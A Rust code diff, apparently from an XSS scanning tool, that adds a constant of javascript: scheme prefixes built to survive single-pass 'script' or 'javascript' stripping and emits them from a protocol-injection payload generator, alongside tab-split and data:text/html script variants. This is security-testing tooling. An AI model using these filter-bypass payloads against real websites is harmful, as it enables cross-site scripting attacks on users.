@@ -158,6 +158,19 @@ pub fn get_mxss_payloads() -> Vec<String> {
     CACHE.clone()
 }
 
+/// `javascript:` scheme prefixes that reconstruct the canonical scheme only
+/// after a server applies a *single-pass* substring strip — `javasscriptcript:`
+/// survives `replace("script", "")` (→ `javascript:`) and `javascriptjavascript:`
+/// survives `replace("javascript", "")` (→ `javascript:`). Emitted verbatim by
+/// [`get_protocol_injection_payloads`] below; recognized by
+/// `check_reflection::decoded_is_dangerous_scheme` so an *un-stripped* (verbatim)
+/// echo of one in an inert position is suppressed instead of being reported as a
+/// false-positive `[R]`. Whitespace-insertion variants (`java\tscript:` …) are
+/// not listed here because the gate already normalizes TAB/LF/CR before matching.
+/// Keep this in sync with the `out.push(...)` lines in the generator.
+pub(crate) const JS_SCHEME_STRIP_MUTATION_PREFIXES: &[&str] =
+    &["javasscriptcript:", "javascriptjavascript:"];
+
 /// Generate protocol-based injection payloads for src/href attributes
 /// (iframe, embed, object, a href, etc.)
 /// These target contexts where a parameter value is placed directly into a `src` or `href`
@@ -182,8 +195,10 @@ pub fn get_protocol_injection_payloads() -> Vec<String> {
             out.push(format!("\njavascript:{}", js)); // leading newline
             // Double-nested javascript: to bypass single-pass removal (e.g. "jajavascriptvascript:")
             out.push(format!("javas\tcript:{}", js));
-            out.push(format!("javasscriptcript:{}", js)); // bypass gsub("javascript","")
-            out.push(format!("javascriptjavascript:{}", js)); // double prefix to survive one-pass strip
+            // Single-pass substring-strip bypasses (see JS_SCHEME_STRIP_MUTATION_PREFIXES).
+            for prefix in JS_SCHEME_STRIP_MUTATION_PREFIXES {
+                out.push(format!("{prefix}{js}"));
+            }
 
             // data: protocol variants
             out.push(format!("data:text/html,<script>{}</script>", js));
